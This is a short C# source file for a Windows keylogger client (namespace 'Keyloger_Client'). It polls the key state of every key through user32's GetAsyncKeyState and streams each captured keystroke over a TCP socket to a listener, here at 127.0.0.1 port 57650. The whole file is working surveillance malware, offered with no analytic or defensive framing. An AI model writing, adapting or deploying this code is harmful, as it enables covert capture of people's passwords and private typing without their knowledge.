using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mime;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Keyloger_Client
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private static Socket socket;
        
        [STAThread]
        static void Main(string[] args)
        {
            socket = CreateSocket();
            socket.Connect(IPAddress.Parse("127.0.0.1"), 57650);

            socket.Send(ToBytes("Connected\n"));

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        string buf;
                        if (((ConsoleKey)i) == ConsoleKey.Spacebar) { buf = " "; continue; }
                        if (((ConsoleKey)i) == ConsoleKey.Enter) { buf = "\r\n"; continue; }
                        if (((ConsoleKey)i).ToString().Length == 1)
                        {
                            buf = ((ConsoleKey)i).ToString();
                        }
                        else
                        {
                            buf = $"<{((ConsoleKey)i).ToString()}>";
                        }
                        
                        socket.Send(ToBytes(buf));
                    }
                }
            }
        }

        public static Socket CreateSocket()
        {
            return new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        public static byte[] ToBytes(string str)
        {
            return Encoding.Unicode.GetBytes(str);
        }
    }
}